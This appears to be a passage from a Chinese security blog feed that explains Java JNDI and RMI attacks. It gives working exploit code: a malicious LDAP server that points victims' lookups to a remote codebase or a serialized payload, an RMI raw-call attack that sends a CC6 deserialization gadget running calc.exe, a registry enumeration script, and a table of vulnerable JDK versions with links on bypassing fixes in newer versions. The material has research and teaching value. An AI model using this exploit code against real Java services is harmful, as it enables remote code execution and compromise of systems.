class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span><br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span><br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="hljs-comment">//$NON-NLS-1$</span><br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>); <span class="hljs-comment">//$NON-NLS-1$</span><br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Client</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPClient0</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:8888/aaa&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(uri);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-返回恶意序列化数据"><a href="#2-返回恶意序列化数据" class="headerlink" title="2.返回恶意序列化数据"></a>2.返回恶意序列化数据</h2><p>这部分只需要修改sendResult方法即可，其它保持不变：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>    System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>    e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>    <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>        cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>    &#125;<br>      <span class="hljs-comment">//在这里填充payload</span><br>    e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;__BASE64_PAYLOAD__&quot;</span>));<br>    result.sendSearchEntry(e);<br>    result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table><thead><tr><th>攻击类型</th><th>适用jdk版本</th><th>需要条件</th></tr></thead><tbody><tr><td>JNDI+RMI (Reference Remote Factory)</td><td>&lt;6u132, 7u122, 8u113</td><td>无</td></tr><tr><td>JNDI+RMI (Reference Local Factory)</td><td>任意</td><td>调用端存在利用链</td></tr><tr><td>JNDI+LDAP (Reference Remote Codebase)</td><td>&lt;11.0.1, 8u191, 7u201, 6u211</td><td>无</td></tr><tr><td>JNDI+LDAP (Serialize Object)</td><td>任意</td><td>调用端存在反序列化链</td></tr></tbody></table><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="JNDI定义详解"><a href="#JNDI定义详解" class="headerlink" title="JNDI定义详解"></a>JNDI定义详解</h2><p>JNDI &#x3D;&#x3D;&gt; <code>Java Naming and Directory Interface</code>  &#x3D;&#x3D;&gt; JAVA 名称和目录接口</p><h3 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h3><img src="/2023/06/02/JNDI%20Attack/image-20230613090137155.png" class="" title="image-20230613090137155"><h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><img src="/2023/06/02/JNDI%20Attack/image-20230613092634595.png" class="" title="image-20230613092634595"><h3 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h3><p>为了方便在JAVA中使用目录协议，JAVA实现了一套目录服务的接口——JDNI，即<code>Java 的名称与目录服务接口</code>，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code>独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</p><p><code>JNDI</code>架构上主要包含两个部分，即 Java 的应用层接口和服务供应接口（SPI），如下图所示:</p><img src="/2023/06/02/JNDI%20Attack/image-20230613092734560.png" class="" title="image-20230613092734560"><h3 id="常用package"><a href="#常用package" class="headerlink" title="常用package"></a>常用package</h3><p>java实现JNDI服务主要在下面5个包中:</p><ul><li><code>javax.naming</code>：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</li><li><code>javax.naming.directory</code>：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类；</li><li><code>javax.naming.event</code>：在命名目录服务器中请求事件通知；</li><li><code>javax.naming.ldap</code>：提供LDAP支持；</li><li><code>javax.naming.spi</code>：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</li></ul><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><strong>JNDI:</strong></p><ul><li><a href="https://tttang.com/archive/1441/">JAVA 协议安全笔记-JNDI篇 - 跳跳糖 (tttang.com)</a></li></ul><p><strong>高版本bypass:</strong></p><ul><li><p><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p></li><li><p><a href="https://tttang.com/archive/1489">https://tttang.com/archive/1489</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI Attack</title>
    <link href="/2023/06/02/RMI%20Attack/"/>
    <url>/2023/06/02/RMI%20Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="RMI组成与调用过程"><a href="#RMI组成与调用过程" class="headerlink" title="RMI组成与调用过程"></a>RMI组成与调用过程</h2><p>RMI(Remote Method Invocation)由三大部分构成：</p><ul><li>Server: 提供远程的对象<ul><li>**骨干网(skeleton)**完成对服务器对象实际的方法调用，并获取返回值。</li></ul></li><li>Client: 调用远程的对象<ul><li>**存根(stub)**扮演着远程服务器对象的代理的角色，使该对象可被客户激活。</li></ul></li><li>Registry: 一个注册表，存放着远程对象的位置（ip、端口、标识符）</li></ul><p>使用RMI调用远程对象方法时的流程如图</p><img src="/2023/06/02/RMI%20Attack/image-20230608103747830.png" class="" title="image-20230608103747830"><p>具体的调用过程是</p><blockquote><ol><li><strong>RMI客户端在调用远程方法时会先创建 Stub(sun.rmi.registry.RegistryImpl_Stub)。</strong></li><li><strong>Stub 会将 Remote 对象传递给远程引用层(java.rmi.server.RemoteRef) 并创建java.rmi.server.RemoteCall(远程调用) 对象。</strong></li><li><strong>RemoteCall 序列化 RMI服务名称、Remote 对象。</strong></li><li><strong>RMI客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI服务端的远程引用层。</strong></li><li><strong>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef) 收到请求会请求传递给 Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)。</strong></li><li><strong>Skeleton 调用 RemoteCall 反序列化 RMI客户端传过来的序列化。</strong></li><li><strong>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</strong></li><li><strong>RMI客户端反序列化服务端结果，获取远程对象的引用。</strong></li><li><strong>RMI客户端调用远程方法，RMI服务端反射调用 RMI服务实现类的对应方法并序列化执行结果返回给客户端。</strong></li><li><strong>RMI客户端反序列化 RMI 远程方法调用结果。</strong></li></ol></blockquote><h2 id="RMI-QuickStart"><a href="#RMI-QuickStart" class="headerlink" title="RMI QuickStart"></a>RMI QuickStart</h2><h3 id="1-创建RMI-Server-amp-amp-Registry"><a href="#1-创建RMI-Server-amp-amp-Registry" class="headerlink" title="1.创建RMI Server&amp;&amp;Registry"></a>1.创建RMI Server&amp;&amp;Registry</h3><p>实际应用中RMI的Server与Registry是同时创建的，主要分为三步：</p><ul><li><strong>创建⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()。</strong></li><li><strong>创建⼀个实现了此接⼝的类。</strong></li><li><strong>创建⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server了。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.spring.rmi;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-comment">//1.创建接口</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>    <span class="hljs-comment">//2.实现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span><br>            <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-built_in">super</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world from SPRING&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//3.创建Registry并绑定对象</span><br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-创建Client并调用"><a href="#2-创建Client并调用" class="headerlink" title="2.创建Client并调用"></a>2.创建Client并调用</h3><p>Client如果本地存在此类，就可以直接接收远程返回的实例并执行方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.spring.rmi;<br><br><span class="hljs-keyword">import</span> org.spring.rmi.RMIServer;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld)<br>                Naming.lookup(<span class="hljs-string">&quot;rmi://172.20.10.2:1099/Hello&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> hello.hello();<br>        System.out.println( ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="协议层分析"><a href="#协议层分析" class="headerlink" title="协议层分析"></a>协议层分析</h2><p>详细内容见文档：<a href="https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html">Java Remote Method Invocation: 10 - RMI Wire Protocol (oracle.com)</a></p><p>协议交互这块比较复杂不想一点点写了(感觉即使写出来也没多大意思)，个人认为重点就就是以下几个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//send raw data to attack RMI</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRawCall</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, ObjID objid, <span class="hljs-type">int</span> opNum, Long hash, Object ...objects)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> SocketFactory.getDefault().createSocket(host, port);<br>        socket.setKeepAlive(<span class="hljs-literal">true</span>);<br>        socket.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>            dos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br><br>            dos.writeInt(TransportConstants.Magic);<br>            dos.writeShort(TransportConstants.Version);<br>            dos.writeByte(TransportConstants.SingleOpProtocol);<br>            dos.write(TransportConstants.Call);<br><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(dos);<br><br>            objid.write(objOut); <span class="hljs-comment">//Objid</span><br>            objOut.writeInt(opNum); <span class="hljs-comment">// opnum</span><br>            objOut.writeLong(hash); <span class="hljs-comment">// hash</span><br><br>            <span class="hljs-keyword">for</span> (Object object:<br>                 objects) &#123;<br>                objOut.writeObject(object);<br>            &#125;<br><br>            os.flush();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (dos != <span class="hljs-literal">null</span>) &#123;<br>                dos.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (socket != <span class="hljs-literal">null</span>) &#123;<br>                socket.close();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ReflectUtils.enableCustomRMIClassLoader();<br>            <span class="hljs-type">RMIRegistryEndpoint</span> <span class="hljs-variable">rmiRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIRegistryEndpoint</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">21099</span>);<br>            <span class="hljs-comment">//还记得遍历攻击里我们实现的无依赖获取远程对象存根吗，这里直接套用了。</span><br>            <span class="hljs-type">RemoteObjectWrapper</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="hljs-string">&quot;math&quot;</span>),<span class="hljs-string">&quot;math&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">payloadObj</span> <span class="hljs-operator">=</span> CC6.getPayloadObject(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>            <span class="hljs-comment">//methodSignature 可以通过javap -s 类名计算</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">methodSignature</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;add(Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;&quot;</span>;<br>            <span class="hljs-comment">//这里直接扒了rmi对应的源码</span><br>            <span class="hljs-type">Long</span> <span class="hljs-variable">methodHash</span> <span class="hljs-operator">=</span> RemoteUtils.computeMethodHash(methodSignature);<br>            sendRawCall(remoteObj.getHost(),remoteObj.getPort(),remoteObj.objID,-<span class="hljs-number">1</span>,methodHash,payloadObj);<br>        &#125;<span class="hljs-keyword">catch</span> (Throwable t)&#123;<br>            t.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="RMI攻击面"><a href="#RMI攻击面" class="headerlink" title="RMI攻击面"></a>RMI攻击面</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>由于list方法可以返回有的绑定名，那么我们可以去通过list+lookup的方式遍历获得所有的远程方法信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//参考 https://github.com/qtc-de/remote-method-guesser</span><br><span class="hljs-keyword">package</span> com.dem0.vuln;<br><br><span class="hljs-keyword">import</span> com.dem0.internal.ReflectUtils;<br><span class="hljs-keyword">import</span> de.qtc.rmg.networking.RMIRegistryEndpoint;<br><span class="hljs-keyword">import</span> de.qtc.rmg.plugin.PluginSystem;<br><span class="hljs-keyword">import</span> de.qtc.rmg.utils.RemoteObjectWrapper;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">infoLeak</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;192.168.59.1&quot;</span>, <span class="hljs-number">1099</span>);<br><span class="hljs-comment">//            System.out.println(registry.list());</span><br>            ReflectUtils.enableCustomRMIClassLoader();<br>            PluginSystem.init(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RMIRegistryEndpoint</span> <span class="hljs-variable">rmiRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIRegistryEndpoint</span>(<span class="hljs-string">&quot;192.168.59.1&quot;</span>, <span class="hljs-number">1099</span>);<br><span class="hljs-comment">//            Remote[] remoteObjList = rmiRegistry.packup(registry.list());</span><br>            RemoteObjectWrapper[] rows = rmiRegistry.lookup(registry.list());<br>            <span class="hljs-keyword">for</span> ( RemoteObjectWrapper row: rows) &#123;<br>                System.out.println(row.className +<span class="hljs-string">&quot;\tport:&quot;</span> +  row.endpoint.getPort());<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Throwable t)&#123;<br>            t.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="加载远程类"><a href="#加载远程类" class="headerlink" title="加载远程类"></a>加载远程类</h3><p>在QuickStart中的例子中，我们使用RMI加载了本地classpath中的类完成方法调用，如果本地classpath中不存在远程lookup到的类就会出现报错。因此类似classpath本地类加载，jdk还提供了一种加载远程类的方式，也就是使用**<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html">codebase</a>**。注意自定义codebase要满足以下条件：</p><ul><li>安装并配置了SecurityManager</li><li>设置了 java.rmi.server.useCodebaseOnly&#x3D;false 或者Java版本低于7u21、6u45(此时该值默认为false)</li></ul><p>想要加载指定地址的远程类，可以在运行server端时指定如下VM options参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">-Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.rmi.server.codebase=http://192.168.111.1:9080/ 